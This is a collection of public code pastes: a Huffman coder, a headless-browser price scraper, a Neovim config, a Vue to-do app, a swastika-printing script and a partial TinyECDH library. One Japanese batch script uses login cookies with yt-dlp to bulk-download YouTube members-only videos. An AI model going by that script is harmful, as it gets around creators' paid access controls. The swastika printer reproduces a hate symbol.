    dfs(root->left, s + ""0"");
    dfs(root->right, s + ""1"");
}
void huffman_coding(vector<char> chars, vector<int> freq) {
    priority_queue<node *, vector<node *>, cmp> pq;
    for(int i = 0; i < (int) chars.size(); i++) {
        pq.push(new node(chars[i], freq[i]));
    }
    
    while(pq.size() > 1) {
        node * left = pq.top();
        pq.pop();
        
        node * right = pq.top();
        pq.pop();
        
        node * root = new node('#', left->freq + right -> freq);
        root->left = left;
        root->right = right;
        pq.push(root);
    }
    
    dfs(pq.top(), """");
}
int main() {
    ios_base::sync_with_stdio(false);
    int n;
    cin >> n;
    vector<char> chars(n);
    vector<int> freq(n);
    for(int i = 0; i < n; i++) {
        cin >> chars[i] >> freq[i];
    }
    
    huffman_coding(chars, freq);
    return 0;
}
/*
 6
 a 5
 b 9
 c 12
 d 13
 e 16
 f 45
 
 **/
"
sH05xDq1,Untitled,dereksir,C#,Sunday 24th of March 2024 04:22:28 AM CDT,"using PuppeteerSharp;

class Program
{
    static async Task Main(string[] args)
    {
        using var browserFetcher = new BrowserFetcher();
        await browserFetcher.DownloadAsync();

		// launch a new headless browser instance
        await using var browser = await Puppeteer.LaunchAsync(
            new LaunchOptions { Headless = true });
		
		// open a new browser page
        await using var page = await browser.NewPageAsync();

		// navigate to target website
        await page.GoToAsync(""https://scrapeme.live/shop/Pikachu/"");

        // extract product price
        var productPrice = await page.EvaluateExpressionAsync<string>(
            ""document.querySelector('#product-752 > div.summary.entry-summary > p.price > span').innerText"");

        // print the product price
        Console.WriteLine(""Product Price: "" + productPrice);

        // close the browser when done
        await browser.CloseAsync();
    }
}"
uQ562ww1,YouTube メンバ限定動画 ダウンロード,yy981,Winbatch,Sunday 24th of March 2024 03:15:39 AM CDT,"rem ほかのファイルの構成についてはコメントのyoutubeを見てください
@echo off
chcp 65001
setlocal enabledelayedexpansion

rem ""注意書き""
echo.
echo ""！注意！""
echo ""download数が多い場合、パソコンが重くなります。""
echo ""download際に、download数に応じて最小化されたウィンドウが開かれます。閉じないでください。""
echo ""download終了次第、勝手にタブが閉じます。""
echo.

rem ""downloadするURLを取得""
:retry_input
set /p playlist_url=Downloadする動画か、再生リストのURLを入力してください。＞
set ""output_file=URLlist.txt""

rem ""URLによって分岐""
if not ""%playlist_url%""==""%playlist_url:playlist?list=%"" (
yt-dlp ""%playlist_url%"" --flat-playlist --skip-download --get-url --quiet --no-warnings > ""%output_file%""
echo downloadする再生リスト内の動画URLは""%output_file%"" に保存されました。＞
)
if not ""%playlist_url%""==""%playlist_url:watch?v=%"" (
echo %playlist_url% > ""%output_file%""
echo 動画URLは""%output_file%""に保存されました。＞
)

rem ""downloadする画質を設定""
echo.
echo 1は、最高画質
echo 2は、高画質
echo 3は、中画質
echo 4は、低画質
set /p image_quality=downloadする画質の番号を入力してください。＞

if %image_quality% equ 1 (
set ""download_image_quality=best[ext=mp4]+best[ext=mp3]/best[ext=mp4]/best""
echo 最高画質が選択されました。
)
if %image_quality% equ 2 (
set ""download_image_quality=best[ext=mp4]+best[ext=mp3]/best[ext=mp4]/best""
echo 高画質が選択されました。
)
if %image_quality% equ 3 (
set ""download_image_quality=worst[ext=mp4]/best[ext=mp4]/best""
echo 中画質が選択されました。
)
if %image_quality% equ 4 (
set ""download_image_quality=worst[ext=mp4]/best[ext=mp4]/best""
echo 低画質が選択されました。
)

rem ""ファイルを指定""
set ""url_list=URLlist.txt""

rem ""downloadを開始""
for /f ""delims="" %%a in (%url_list%) do (
start /min """" yt-dlp ""%%a"" --cookies cookies.txt --write-thumbnail --embed-thumbnail --add-metadata --write-sub --socket-timeout 30 --download-archive ""finished.txt"" --ignore-errors -f ""%download_image_quality%"" --output ""%output_folder%\%%(upload_date)s-%%(title)s.%%(ext)s"" --retries 3
)

echo ダウンロード待機中
:wait_loop
timeout /t 5 /nobreak >nul
tasklist /fi ""imagename eq yt_dlp.exe"" | find /i ""yt_dlp.exe"" >nul
if (%errorlevel%==1) goto wait_loop

rem ""ファイルの整理の実行""
echo ファイルの整理を実行します。
rem 移動先ファイルを指定
set ""webp_folder=webp""
set ""mp4_folder=mp4""
set ""json_folder=json""
set ""jpg_folder=jpg""

rem フォルダーがなかった場合作成
mkdir ""%webp_folder%"" 2>nul
mkdir ""%mp4_folder%"" 2>nul
mkdir ""%json_folder%"" 2>nul
mkdir ""%jpg_folder%"" 2>nul

rem フォルダに振り分け
move ""*.webp"" ""%webp_folder%\"" 2>nul
move ""*.mp4"" ""%mp4_folder%\"" 2>nul
move ""*.json"" ""%json_folder%\"" 2>nul
move ""*.jpg"" ""%jpg_folder%\"" 2>nul

echo ファイルの移動が完了しました。
pause"
0zx9QYSW,Untitled,mladrad,Python,Sunday 24th of March 2024 03:09:01 AM CDT,"print('Hello SoftUní')
"
HgQ80yKH,Neovim Dashboard Config,Abir-Tx,Lua,Sunday 24th of March 2024 02:38:49 AM CDT,"-- dashboard-nvim settings
require('dashboard').setup {
    theme = 'hyper',
    disable_move = true,
    shortcut_type = 'number',
    change_to_vcs_root = true,
    config = {
        week_header = {
            enable = true,
        },
        shortcut = {
            { desc = '󰊳 Update', group = '@property', action = 'Lazy update', key = 'u' },
            {
                icon = ' ',
                icon_hl = '@variable',
                desc = 'Files',
                group = 'Label',
                action = 'Telescope find_files',
                key = 'f',
            },
            {
                desc = ' Neovim Config',
                group = 'DiagnosticHint',
                action = 'cd ~/.config/nvim | edit init.lua',
                key = 'a',
            },
            {
                desc = ' dotfiles',
                group = 'DiagnosticInfo',
                action = 'Telescope find_files cwd=~/code/github/setup-Aorus-Xtrex/archlinux/',
                key = 'd',
            },
        },
        packages = { enable = true },
        project = { enable = true, limit = 8, icon = ' ', label = 'My Projects', action = 'Telescope find_files cwd=' },
        mru = { limit = 15, icon = ' ', label = 'My Files', cwd_only = false },
    },
}
"
h9QJx64B,swastika,Nenogzar,Python,Sunday 24th of March 2024 01:57:30 AM CDT,"def print_swastika(rows, cols):
    for i in range(rows):
        for j in range(cols):
            if i < rows // 2:
                if j < cols // 2:
                    if j == 0:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
                elif j == cols // 2:
                    print(""#"", end="" "")
                else:
                    if i == 0:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
            elif i == rows // 2:
                print(""#"", end="" "")
            else:
                if j > cols // 2:
                    if j == cols - 1:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
                elif j == cols // 2:
                    print(""#"", end="" "")
                else:
                    if i == rows - 1:
                        print(""#"", end="" "")
                    else:
                        print("" "", end="" "")
        print()

# For correct figure, enter only odd values for column and row
print_swastika(5, 5)"
0DRfyL2P,todo_list_with_notes,Python253,HTML,Sunday 24th of March 2024 12:51:10 AM CDT,"<!--
This script defines a Vue.js application for creating a to-do list with notes.
Users can input new tasks and corresponding notes, view the list of tasks with notes, and delete tasks as needed. 
The application is styled using CSS to provide a visually appealing and user-friendly interface. 
The Vue.js framework is utilized for data binding and DOM manipulation, enabling dynamic updates to the task list without page reloads.
-->
<!DOCTYPE html>
<html lang=""en"">

<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>TO-DO LIST WITH NOTES</title>
	<!-- Importing Vue.js library -->
	<script src=""https://cdn.jsdelivr.net/npm/vue@2""></script>
	<style>
	/* Styling for the entire document */
	
	body {
		font-family: Arial, sans-serif;
		margin: 0;
		padding: 0;
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
		/* Background gradient */
		background: linear-gradient(-45deg, #000, #000, #191970, #4B0082, #191970, #000, #000);
	}
	/* Styling for the main application container */
	
	#app {
		background-color: #fff;
		padding: 20px;
		border-radius: 8px;
		box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		position: absolute;
		top: 10%;
		left: 10%;
		right: 10%;
		border: 4px solid #000;
		word-wrap: break-word;
		display: flex;
		flex-direction: column;
	}
	/* Styling for headers */
	
	h1,
	strong,
	span {
		text-align: left;
		margin-bottom: 20px;
		font-weight: bold;
	}
	/* Styling for input fields */
	
	input[type=""text""],
	textarea {
		width: calc(100% - 40px);
		padding: 8px;
		border-radius: 4px;
		border: 1px solid #ccc;
		margin-bottom: 10px;
		resize: vertical;
	}
	/* Styling for the to-do list */
	
	ul {
		list-style-type: none;
		padding: 0;
		flex-grow: 1;
		overflow-y: auto;
	}
	
	li {
		display: flex;
		flex-direction: column;
		padding: 8px;
		border-bottom: 1px solid #ccc;
	}
	
	.task {
		margin-bottom: 5px;
		flex-grow: 1;
	}
	/* Styling for buttons */
	
	button {
		background-color: #ff6347;
		color: #fff;
		border: none;
		border-radius: 4px;
		padding: 4px 8px;
		cursor: pointer;
	}
	
	button:hover {
		background-color: #ff473d;
	}
	/* Styling for the submit button */
	
	.submit-btn {
		align-self: flex-end;
	}
	</style>
</head>

<body>
	<!-- Main application container -->
	<div id=""app"">
		<!-- Header -->
		<h1><strong>TO-DO LIST</strong></h1>
		<!-- Input field for adding a new task -->
		<input type=""text"" v-model=""newTodo.task"" placeholder=""ADD A NEW TASK & PRESS [ENTER]..."" @keyup.enter=""focusNotesInput"" ref=""taskInput"">
		<!-- Text area for adding notes -->
		<textarea v-model=""newTodo.note"" placeholder=""ADD NOTES & SELECT [SUBMIT]..."" ref=""notesInput""></textarea>
		<!-- Displaying the list of to-do items -->
		<ul>
			<li v-for=""(todo, index) in todos"" :key=""index"">
				<!-- Displaying the task and a delete button -->
				<div style=""display: flex; align-items: center;""> <strong class=""task"">{{ todo.task }}</strong>
					<button style=""margin-left: 10px;"" @click=""removeTodo(index)"">X</button>
				</div>
				<!-- Displaying notes for the task --><strong>Notes:</strong>
				<br>{{ todo.note }} </li>
		</ul>
		<!-- Submit button -->
		<button class=""submit-btn"" @click=""addTodo"">[SUBMIT]</button>
	</div>
	<!-- Vue.js script -->
	<script>
	// Vue.js instance
	var app = new Vue({
		el: '#app', // Mounting point
		data: {
			// Data for managing to-do items
			newTodo: {
				task: '',
				note: ''
			}, // New to-do item
			todos: [] // List of to-do items
		},
		methods: {
			// Method to add a new to-do item
			addTodo: function() {
				if(this.newTodo.task !== '') {
					this.todos.push({
						task: this.newTodo.task,
						note: this.newTodo.note
					}); // Add new item to the list
					this.newTodo.task = ''; // Clear task input
					this.newTodo.note = ''; // Clear note input
					this.$refs.taskInput.focus(); // Focus on task input
				}
			},
			// Method to remove a to-do item
			removeTodo: function(index) {
				this.todos.splice(index, 1); // Remove item from the list
			},
			// Method to focus on notes input
			focusNotesInput: function() {
				this.$refs.notesInput.focus(); // Focus on notes input
			}
		}
	})
	</script>
</body>

</html>"
smsMaPs6,libs/TinyECDH/ecdh.h,FlyFar,C++,Sunday 24th of March 2024 12:23:39 AM CDT,"/* 

  Crypto using elliptic curves defined over the finite binary field GF(2^m) where m is prime.

  The curves used are the anomalous binary curves (ABC-curves) or also called Koblitz curves.

  This class of curves was chosen because it yields efficient implementation of operations.



  Curves available - their different NIST/SECG names and eqivalent symmetric security level:

      NIST      SEC Group     strength
    ------------------------------------
      K-163     sect163k1      80 bit
      B-163     sect163r2      80 bit
      K-233     sect233k1     112 bit
      B-233     sect233r1     112 bit
      K-283     sect283k1     128 bit
      B-283     sect283r1     128 bit
      K-409     sect409k1     192 bit
      B-409     sect409r1     192 bit
      K-571     sect571k1     256 bit
      B-571     sect571r1     256 bit



  Curve parameters from:

    http://www.secg.org/sec2-v2.pdf
    http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf


  Reference:

    https://www.ietf.org/rfc/rfc4492.txt 
*/

#ifndef _ECDH_H__
#define _ECDH_H__


/* for size-annotated integer types: uint8_t, uint32_t etc. */
#include <stdint.h> 

#ifdef __cplusplus
extern ""C"" {
#endif /* __cplusplus */

#define NIST_B163  1
#define NIST_K163  2
#define NIST_B233  3
#define NIST_K233  4
#define NIST_B283  5
#define NIST_K283  6
#define NIST_B409  7
#define NIST_K409  8
#define NIST_B571  9
#define NIST_K571 10

/* What is the default curve to use? */
#ifndef ECC_CURVE
 #define ECC_CURVE NIST_K571
#endif

#if defined(ECC_CURVE) && (ECC_CURVE != 0)
 #if   (ECC_CURVE == NIST_K163) || (ECC_CURVE == NIST_B163)
  #define CURVE_DEGREE       163
  #define ECC_PRV_KEY_SIZE   24
 #elif (ECC_CURVE == NIST_K233) || (ECC_CURVE == NIST_B233)
  #define CURVE_DEGREE       233
  #define ECC_PRV_KEY_SIZE   32
 #elif (ECC_CURVE == NIST_K283) || (ECC_CURVE == NIST_B283)
  #define CURVE_DEGREE       283
  #define ECC_PRV_KEY_SIZE   36
 #elif (ECC_CURVE == NIST_K409) || (ECC_CURVE == NIST_B409)
  #define CURVE_DEGREE       409
  #define ECC_PRV_KEY_SIZE   52
 #elif (ECC_CURVE == NIST_K571) || (ECC_CURVE == NIST_B571)
  #define CURVE_DEGREE       571
  #define ECC_PRV_KEY_SIZE   72
 #endif
#else
 #error Must define a curve to use
#endif

#define ECC_PUB_KEY_SIZE     (2 * ECC_PRV_KEY_SIZE)


/******************************************************************************/


/* NOTE: assumes private is filled with random data before calling */
int ecdh_generate_keys(uint8_t* public_key, uint8_t* private_key);

/* input: own private key + other party's public key, output: shared secret */
int ecdh_shared_secret(const uint8_t* private_key, const uint8_t* others_pub, uint8_t* output);


/******************************************************************************/

#ifdef __cplusplus
}
#endif /* __cplusplus */

#endif /* #ifndef _ECDH_H__ */
"
nrU5TsRq,libs/TinyECDH/ecdh.cpp,FlyFar,C++,Sunday 24th of March 2024 12:21:29 AM CDT,"/* 

  Crypto using elliptic curves defined over the finite binary field GF(2^m) where m is prime.

  The curves used are the anomalous binary curves (ABC-curves) or also called Koblitz curves.

  This class of curves was chosen because it yields efficient implementation of operations.



  Curves available - their different NIST/SECG names and eqivalent symmetric security level:

      NIST      SEC Group     strength
    ------------------------------------
      K-163     sect163k1      80 bit
      B-163     sect163r2      80 bit
      K-233     sect233k1     112 bit
      B-233     sect233r1     112 bit
      K-283     sect283k1     128 bit
      B-283     sect283r1     128 bit
      K-409     sect409k1     192 bit
      B-409     sect409r1     192 bit
      K-571     sect571k1     256 bit
      B-571     sect571r1     256 bit



  Curve parameters from:

    http://www.secg.org/sec2-v2.pdf
    http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf


  Reference:

    https://www.ietf.org/rfc/rfc4492.txt 
*/

#include <stdint.h>
#include ""ecdh.h""


/* margin for overhead needed in intermediate calculations */
#define BITVEC_MARGIN     3
#define BITVEC_NBITS      (CURVE_DEGREE + BITVEC_MARGIN)
#define BITVEC_NWORDS     ((BITVEC_NBITS + 31) / 32)
#define BITVEC_NBYTES     (sizeof(uint32_t) * BITVEC_NWORDS)


/* Disable assertions? */
#ifndef DISABLE_ASSERT
 #define DISABLE_ASSERT 0
#endif

#if defined(DISABLE_ASSERT) && (DISABLE_ASSERT == 1)
 #define assert(...)
#else
 #include <assert.h>
#endif

/* Default to a (somewhat) constant-time mode?
   NOTE: The library is _not_ capable of operating in constant-time and leaks information via timing.
         Even if all operations are written const-time-style, it requires the hardware is able to multiply in constant time. 
         Multiplication on ARM Cortex-M processors takes a variable number of cycles depending on the operands...
*/
#ifndef CONST_TIME
  #define CONST_TIME 0
#endif

/* Default to using ECC_CDH (cofactor multiplication-variation) ? */
#ifndef ECDH_COFACTOR_VARIANT
  #define ECDH_COFACTOR_VARIANT 0
#endif

/******************************************************************************/


/* the following type will represent bit vectors of length (CURVE_DEGREE+MARGIN) */
typedef uint32_t bitvec_t[BITVEC_NWORDS];
typedef bitvec_t gf2elem_t;           /* this type will represent field elements */
typedef bitvec_t scalar_t;
 

/******************************************************************************/

/* Here the curve parameters are defined. */

#if defined (ECC_CURVE) && (ECC_CURVE != 0)
 #if (ECC_CURVE == NIST_K163)
  #define coeff_a  1
  #define cofactor 2
/* NIST K-163 */
const gf2elem_t polynomial = { 0x000000c9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000008 }; 
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0x5c94eee8, 0xde4e6d5e, 0xaa07d793, 0x7bbc11ac, 0xfe13c053, 0x00000002 }; 
const gf2elem_t base_y     = { 0xccdaa3d9, 0x0536d538, 0x321f2e80, 0x5d38ff58, 0x89070fb0, 0x00000002 }; 
const scalar_t  base_order = { 0x99f8a5ef, 0xa2e0cc0d, 0x00020108, 0x00000000, 0x00000000, 0x00000004 }; 
 #endif

 #if (ECC_CURVE == NIST_B163)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-163 */
const gf2elem_t polynomial = { 0x000000c9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000008 }; 
const gf2elem_t coeff_b    = { 0x4a3205fd, 0x512f7874, 0x1481eb10, 0xb8c953ca, 0x0a601907, 0x00000002 }; 
const gf2elem_t base_x     = { 0xe8343e36, 0xd4994637, 0xa0991168, 0x86a2d57e, 0xf0eba162, 0x00000003 }; 
const gf2elem_t base_y     = { 0x797324f1, 0xb11c5c0c, 0xa2cdd545, 0x71a0094f, 0xd51fbc6c, 0x00000000 }; 
const scalar_t  base_order = { 0xa4234c33, 0x77e70c12, 0x000292fe, 0x00000000, 0x00000000, 0x00000004 }; 
 #endif

 #if (ECC_CURVE == NIST_K233)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-233 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00000400, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000200 };
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 };
const gf2elem_t base_x     = { 0xefad6126, 0x0a4c9d6e, 0x19c26bf5, 0x149563a4, 0x29f22ff4, 0x7e731af1, 0x32ba853a, 0x00000172 };
const gf2elem_t base_y     = { 0x56fae6a3, 0x56e0c110, 0xf18aeb9b, 0x27a8cd9b, 0x555a67c4, 0x19b7f70f, 0x537dece8, 0x000001db };
const scalar_t  base_order = { 0xf173abdf, 0x6efb1ad5, 0xb915bcd4, 0x00069d5b, 0x00000000, 0x00000000, 0x00000000, 0x00000080 };
 #endif

 #if (ECC_CURVE == NIST_B233)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-233 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00000400, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000200 }; 
const gf2elem_t coeff_b    = { 0x7d8f90ad, 0x81fe115f, 0x20e9ce42, 0x213b333b, 0x0923bb58, 0x332c7f8c, 0x647ede6c, 0x00000066 }; 
const gf2elem_t base_x     = { 0x71fd558b, 0xf8f8eb73, 0x391f8b36, 0x5fef65bc, 0x39f1bb75, 0x8313bb21, 0xc9dfcbac, 0x000000fa }; 
const gf2elem_t base_y     = { 0x01f81052, 0x36716f7e, 0xf867a7ca, 0xbf8a0bef, 0xe58528be, 0x03350678, 0x6a08a419, 0x00000100 }; 
const scalar_t  base_order = { 0x03cfe0d7, 0x22031d26, 0xe72f8a69, 0x0013e974, 0x00000000, 0x00000000, 0x00000000, 0x00000100 };
 #endif

 #if (ECC_CURVE == NIST_K283)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-283 */
const gf2elem_t polynomial = { 0x000010a1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 };
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0x58492836, 0xb0c2ac24, 0x16876913, 0x23c1567a, 0x53cd265f, 0x62f188e5, 0x3f1a3b81, 0x78ca4488, 0x0503213f }; 
const gf2elem_t base_y     = { 0x77dd2259, 0x4e341161, 0xe4596236, 0xe8184698, 0xe87e45c0, 0x07e5426f, 0x8d90f95d, 0x0f1c9e31, 0x01ccda38 }; 
const scalar_t  base_order = { 0x1e163c61, 0x94451e06, 0x265dff7f, 0x2ed07577, 0xffffe9ae, 0xffffffff, 0xffffffff, 0xffffffff, 0x01ffffff }; 
 #endif

 #if (ECC_CURVE == NIST_B283)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-283 */
const gf2elem_t polynomial = { 0x000010a1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 }; 
const gf2elem_t coeff_b    = { 0x3b79a2f5, 0xf6263e31, 0xa581485a, 0x45309fa2, 0xca97fd76, 0x19a0303f, 0xa5a4af8a, 0xc8b8596d, 0x027b680a }; 
const gf2elem_t base_x     = { 0x86b12053, 0xf8cdbecd, 0x80e2e198, 0x557eac9c, 0x2eed25b8, 0x70b0dfec, 0xe1934f8c, 0x8db7dd90, 0x05f93925 }; 
const gf2elem_t base_y     = { 0xbe8112f4, 0x13f0df45, 0x826779c8, 0x350eddb0, 0x516ff702, 0xb20d02b4, 0xb98fe6d4, 0xfe24141c, 0x03676854 }; 
const scalar_t  base_order = { 0xefadb307, 0x5b042a7c, 0x938a9016, 0x399660fc, 0xffffef90, 0xffffffff, 0xffffffff, 0xffffffff, 0x03ffffff }; 
 #endif

 #if (ECC_CURVE == NIST_K409)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-409 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00800000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000000 }; 
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0xe9023746, 0xb35540cf, 0xee222eb1, 0xb5aaaa62, 0xc460189e, 0xf9f67cc2, 0x27accfb8, 0xe307c84c, 0x0efd0987, 0x0f718421, 0xad3ab189, 0x658f49c1, 0x0060f05f }; 
const gf2elem_t base_y     = { 0xd8e0286b, 0x5863ec48, 0xaa9ca27a, 0xe9c55215, 0xda5f6c42, 0xe9ea10e3, 0xe6325165, 0x918ea427, 0x3460782f, 0xbf04299c, 0xacba1dac, 0x0b7c4e42, 0x01e36905 }; 
const scalar_t  base_order = { 0xe01e5fcf, 0x4b5c83b8, 0xe3e7ca5b, 0x557d5ed3, 0x20400ec4, 0x83b2d4ea, 0xfffffe5f, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x007fffff }; 
 #endif

 #if (ECC_CURVE == NIST_B409)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-409 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00800000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000000 }; 
const gf2elem_t coeff_b    = { 0x7b13545f, 0x4f50ae31, 0xd57a55aa, 0x72822f6c, 0xa9a197b2, 0xd6ac27c8, 0x4761fa99, 0xf1f3dd67, 0x7fd6422e, 0x3b7b476b, 0x5c4b9a75, 0xc8ee9feb, 0x0021a5c2 }; 
const gf2elem_t base_x     = { 0xbb7996a7, 0x60794e54, 0x5603aeab, 0x8a118051, 0xdc255a86, 0x34e59703, 0xb01ffe5b, 0xf1771d4d, 0x441cde4a, 0x64756260, 0x496b0c60, 0xd088ddb3, 0x015d4860 }; 
const gf2elem_t base_y     = { 0x0273c706, 0x81c364ba, 0xd2181b36, 0xdf4b4f40, 0x38514f1f, 0x5488d08f, 0x0158aa4f, 0xa7bd198d, 0x7636b9c5, 0x24ed106a, 0x2bbfa783, 0xab6be5f3, 0x0061b1cf }; 
const scalar_t  base_order = { 0xd9a21173, 0x8164cd37, 0x9e052f83, 0x5fa47c3c, 0xf33307be, 0xaad6a612, 0x000001e2, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x01000000 }; 
 #endif

 #if (ECC_CURVE == NIST_K571)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-571 */
const gf2elem_t polynomial = { 0x00000425, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 }; 
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0xa01c8972, 0xe2945283, 0x4dca88c7, 0x988b4717, 0x494776fb, 0xbbd1ba39, 0xb4ceb08c, 0x47da304d, 0x93b205e6, 0x43709584, 0x01841ca4, 0x60248048, 0x0012d5d4, 0xac9ca297, 0xf8103fe4, 0x82189631, 0x59923fbc, 0x026eb7a8 }; 
const gf2elem_t base_y     = { 0x3ef1c7a3, 0x01cd4c14, 0x591984f6, 0x320430c8, 0x7ba7af1b, 0xb620b01a, 0xf772aedc, 0x4fbebbb9, 0xac44aea7, 0x9d4979c0, 0x006d8a2c, 0xffc61efc, 0x9f307a54, 0x4dd58cec, 0x3bca9531, 0x4f4aeade, 0x7f4fbf37, 0x0349dc80 }; 
const scalar_t  base_order = { 0x637c1001, 0x5cfe778f, 0x1e91deb4, 0xe5d63938, 0xb630d84b, 0x917f4138, 0xb391a8db, 0xf19a63e4, 0x131850e1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000000 }; 
 #endif

 #if (ECC_CURVE == NIST_B571)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-571 */
const gf2elem_t polynomial = { 0x00000425, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 }; 
const gf2elem_t coeff_b    = { 0x2955727a, 0x7ffeff7f, 0x39baca0c, 0x520e4de7, 0x78ff12aa, 0x4afd185a, 0x56a66e29, 0x2be7ad67, 0x8efa5933, 0x84ffabbd, 0x4a9a18ad, 0xcd6ba8ce, 0xcb8ceff1, 0x5c6a97ff, 0xb7f3d62f, 0xde297117, 0x2221f295, 0x02f40e7e }; 
const gf2elem_t base_x     = { 0x8eec2d19, 0xe1e7769c, 0xc850d927, 0x4abfa3b4, 0x8614f139, 0x99ae6003, 0x5b67fb14, 0xcdd711a3, 0xf4c0d293, 0xbde53950, 0xdb7b2abd, 0xa5f40fc8, 0x955fa80a, 0x0a93d1d2, 0x0d3cd775, 0x6c16c0d4, 0x34b85629, 0x0303001d }; 
const gf2elem_t base_y     = { 0x1b8ac15b, 0x1a4827af, 0x6e23dd3c, 0x16e2f151, 0x0485c19b, 0xb3531d2f, 0x461bb2a8, 0x6291af8f, 0xbab08a57, 0x84423e43, 0x3921e8a6, 0x1980f853, 0x009cbbca, 0x8c6c27a6, 0xb73d69d7, 0x6dccfffe, 0x42da639b, 0x037bf273 }; 
const scalar_t  base_order = { 0x2fe84e47, 0x8382e9bb, 0x5174d66e, 0x161de93d, 0xc7dd9ca1, 0x6823851e, 0x08059b18, 0xff559873, 0xe661ce18, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x03ffffff }; 
 #endif
#endif



/*************************************************************************************************/

/* Private / static functions: */


/* some basic bit-manipulation routines that act on bit-vectors follow */
static int bitvec_get_bit(const bitvec_t x, const uint32_t idx)
{
  return ((x[idx / 32U] >> (idx & 31U) & 1U));
}

static void bitvec_clr_bit(bitvec_t x, const uint32_t idx)
{
  x[idx / 32U] &= ~(1U << (idx & 31U));
}

static void bitvec_copy(bitvec_t x, const bitvec_t y)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    x[i] = y[i];
  }
}

static void bitvec_swap(bitvec_t x, bitvec_t y)
{
  bitvec_t tmp;
  bitvec_copy(tmp, x);
  bitvec_copy(x, y);
  bitvec_copy(y, tmp);
}

#if defined(CONST_TIME) && (CONST_TIME == 0)
/* fast version of equality test */
static int bitvec_equal(const bitvec_t x, const bitvec_t y)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    if (x[i] != y[i])
    {
      return 0;
    }
  }
  return 1;
}
#else
/* constant time version of equality test */
static int bitvec_equal(const bitvec_t x, const bitvec_t y)
{
  int ret = 1;
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    ret &= (x[i] == y[i]);
  }
  return ret;
}
#endif

static void bitvec_set_zero(bitvec_t x)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    x[i] = 0;
  }
}

#if defined(CONST_TIME) && (CONST_TIME == 0)
/* fast implementation */
static int bitvec_is_zero(const bitvec_t x)
{
  uint32_t i = 0;
  while (i < BITVEC_NWORDS)
  {
    if (x[i] != 0)
    {
      break;
    }
    i += 1;
  }
  return (i == BITVEC_NWORDS);
}
#else
/* constant-time implementation */
static int bitvec_is_zero(const bitvec_t x)
{
  int ret = 1;
  int i = 0;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    ret &= (x[i] == 0);
  }
  return ret;
}
#endif

/* return the number of the highest one-bit + 1 */
static int bitvec_degree(const bitvec_t x)
{
  int i = BITVEC_NWORDS * 32;

  /* Start at the back of the vector (MSB) */
  x += BITVEC_NWORDS;

  /* Skip empty / zero words */
  while (    (i > 0)
